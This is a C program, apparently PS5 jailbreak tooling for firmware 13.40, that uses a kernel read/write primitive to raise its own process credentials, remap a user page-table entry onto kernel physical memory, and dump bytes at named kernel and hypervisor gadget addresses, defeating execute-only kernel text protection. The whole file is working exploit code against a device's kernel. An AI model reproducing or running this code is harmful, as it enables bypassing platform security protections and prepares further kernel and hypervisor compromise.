/* Dump 13.40 ktext bytes via a never-touched user PTE alias.
 * mmap 2 pages, fault only page 0 (creates the PT), write page 1's PTE
 * to the target physical frame without XOTEXT, first access walks fresh.
 * Restores the PTE. No gadget execution, no IDT/TSS, no 2M PDE edits.
 */
#include <fcntl.h>
#include <inttypes.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#include <ps5/kernel.h>

#define PA_MASK 0x000ffffffffff000ULL
#define PMAP_STORE_RVA 0x3B28FF8ULL
#define U_PTE (0x1ULL | 0x2ULL | 0x4ULL | (1ULL << 63)) /* P RW U NX */

static const struct {
  uint64_t rva;
  const char *name;
} targets[] = {
    {0x257B33ULL, "swapgs_add_iret"},
    {0x257B36ULL, "add_rsp_iret"},
    {0x257B3DULL, "doreti_iret"},
    {0x255034ULL, "wrmsr_ret"},
    {0x25213EULL, "PIVOT"},
    {0x252160ULL, "cpu_switch"},
    {0x2529D8ULL, "DBREG_RESUME"},
    {0x259280ULL, "copyin"},
    {0x269FB8ULL, "MP_STARTUP_INIT"},
    {0xC0A620ULL, "HV_MP_STARTUP"},
};
#define NT (sizeof targets / sizeof targets[0])

static uint64_t g_dmap, g_kcr3, g_ucr3;

static int
readn(uint64_t a, void *b, size_t n) {
  return kernel_copyout((intptr_t)a, b, n);
}
static int
writen(uint64_t a, const void *b, size_t n) {
  return kernel_copyin(b, (intptr_t)a, n);
}

static int
v2p(uint64_t cr3, uint64_t va, uint64_t *pa_out, uint64_t *leaf, int *shift_out) {
  uint64_t pml = cr3 & PA_MASK;
  for(int i = 39; i >= 12; i -= 9) {
    uint64_t e = 0;
    uint64_t slot = g_dmap + pml + (((va >> i) & 0x1ffULL) << 3);
    if(readn(slot, &e, 8))
      return 1;
    if(!(e & 1))
      return 2;
    if((e & 0x80ULL) || i == 12) {
      *pa_out = (e & ((1ULL << 52) - (1ULL << i))) | (va & ((1ULL << i) - 1));
      *leaf = e;
      if(shift_out)
        *shift_out = i;
      return 0;
    }
    pml = e & PA_MASK;
  }
  return 3;
}

static int
pte4k_slot(uint64_t cr3, uint64_t va, uint64_t *slot_out, uint64_t *pte_out) {
  uint64_t pml = cr3 & PA_MASK, e = 0, slot = 0;
  for(int i = 39; i >= 12; i -= 9) {
    slot = g_dmap + pml + (((va >> i) & 0x1ffULL) << 3);
    if(readn(slot, &e, 8))
      return 1;
    if(i == 12) {
      *slot_out = slot;
      *pte_out = e;
      return 0;
    }
    if(!(e & 1))
      return 2;
    if(e & 0x80ULL)
      return 4;
    pml = e & PA_MASK;
  }
  return 3;
}

int
main(void) {
  uint64_t text = (uint64_t)KERNEL_ADDRESS_TEXT_BASE;
  uint64_t kptrs[2], uptrs[2];
  uint8_t buf[32];
  uint8_t *map;
  int fd = open("/data/text_read_1340.log", O_WRONLY | O_CREAT | O_TRUNC, 0644);
  if(fd < 0)
    fd = open("/mnt/usb0/text_read_1340.log", O_WRONLY | O_CREAT | O_TRUNC, 0644);
  if(fd >= 0) {
    dup2(fd, STDOUT_FILENO);
    dup2(fd, STDERR_FILENO);
    if(fd > STDERR_FILENO)
      close(fd);
  }
  setvbuf(stdout, NULL, _IONBF, 0);

  printf("text read; fw=%#x text=%#" PRIx64 "\n", kernel_get_fw_version(),
         text);
  printf("vm_pmap_off=%#lx proc_vmspace_off=%#lx\n",
         (unsigned long)KERNEL_OFFSET_VMSPACE_VM_PMAP,
         (unsigned long)KERNEL_OFFSET_PROC_P_VMSPACE);
  fsync(STDOUT_FILENO);
  if((kernel_get_fw_version() & 0xffff0000U) != 0x13400000U)
    return 1;
  kernel_set_ucred_authid(getpid(), 0x4800000000000007ULL);

  if(readn(text + PMAP_STORE_RVA + 32, kptrs, sizeof kptrs)) {
    printf("kpmap+32 fail\n");
    return 2;
  }
  g_dmap = kptrs[0] - kptrs[1];
  g_kcr3 = kptrs[1];
  printf("kdmap=%#" PRIx64 " kcr3=%#" PRIx64 "\n", g_dmap, g_kcr3);

  {
    intptr_t proc = kernel_get_proc(getpid());
    uint64_t vm = 0, pmap = 0;
    if(!proc) {
      printf("no proc\n");
      return 3;
    }
    if(readn((uint64_t)proc + (uint64_t)KERNEL_OFFSET_PROC_P_VMSPACE, &vm, 8) ||
       !vm) {
      printf("vmspace fail proc=%#" PRIx64 "\n", (uint64_t)proc);
      return 3;
    }
    pmap = vm + 0x2e8ULL;
    if(KERNEL_OFFSET_VMSPACE_VM_PMAP)
      pmap = vm + (uint64_t)KERNEL_OFFSET_VMSPACE_VM_PMAP;
    if(readn(pmap + 32, uptrs, sizeof uptrs)) {
      printf("upmap+32 fail pmap=%#" PRIx64 "\n", pmap);
      return 3;
    }
    g_ucr3 = uptrs[1];
    printf("proc=%#" PRIx64 " vm=%#" PRIx64 " pmap=%#" PRIx64
           " upml4=%#" PRIx64 " ucr3=%#" PRIx64 "\n",
           (uint64_t)proc, vm, pmap, uptrs[0], uptrs[1]);
    if(!g_ucr3) {
      printf("ABORT ucr3=0\n");
      return 3;
    }
  }
  fsync(STDOUT_FILENO);

  map = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE,
             MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if(map == MAP_FAILED) {
    printf("mmap fail\n");
    return 4;
  }
  map[0] = 0x5a;
  {
    uint64_t pa = 0, leaf = 0;
    int sh = 0;
    int rc = v2p(g_ucr3, (uint64_t)(uintptr_t)map, &pa, &leaf, &sh);
    printf("map0 va=%p v2p_rc=%d pa=%#" PRIx64 " sh=%d leaf=%#" PRIx64 "\n",
           (void *)map, rc, pa, sh, leaf);
  }

  uint64_t alias = (uint64_t)(uintptr_t)(map + 0x1000);
  uint64_t slot = 0, oldpte = 0;
  if(pte4k_slot(g_ucr3, alias, &slot, &oldpte)) {
    printf("alias pte slot fail\n");
    return 5;
  }
  printf("alias va=%#" PRIx64 " slot=%#" PRIx64 " oldpte=%#" PRIx64 "\n",
         alias, slot, oldpte);
  fsync(STDOUT_FILENO);

  for(size_t t = 0; t < NT; t++) {
    uint64_t va = text + targets[t].rva;
    uint64_t kpa = 0, kleaf = 0, newpte;
    int sh = 0;
    int rc = v2p(g_kcr3, va, &kpa, &kleaf, &sh);
    printf("%-16s rva=%#llx v2p_rc=%d pa=%#" PRIx64 " sh=%d leaf=%#" PRIx64
           "\n",
           targets[t].name, (unsigned long long)targets[t].rva, rc, kpa, sh,
           kleaf);
    if(rc) {
      fsync(STDOUT_FILENO);
      continue;
    }
    newpte = (kpa & PA_MASK) | U_PTE;
    if(writen(slot, &newpte, 8)) {
      printf("  pte write fail\n");
      continue;
    }
    memset(buf, 0xcc, sizeof buf);
    memcpy(buf, (void *)(uintptr_t)(alias + (targets[t].rva & 0xfffULL) - 8),
           sizeof buf);
    writen(slot, &oldpte, 8);
    printf("  bytes:");
    for(size_t i = 0; i < sizeof buf; i++)
      printf(" %02x", buf[i]);
    printf("\n");
    fsync(STDOUT_FILENO);
  }

  writen(slot, &oldpte, 8);
  printf("TEXT_READ_DONE\n");
  fsync(STDOUT_FILENO);
  return 0;
}
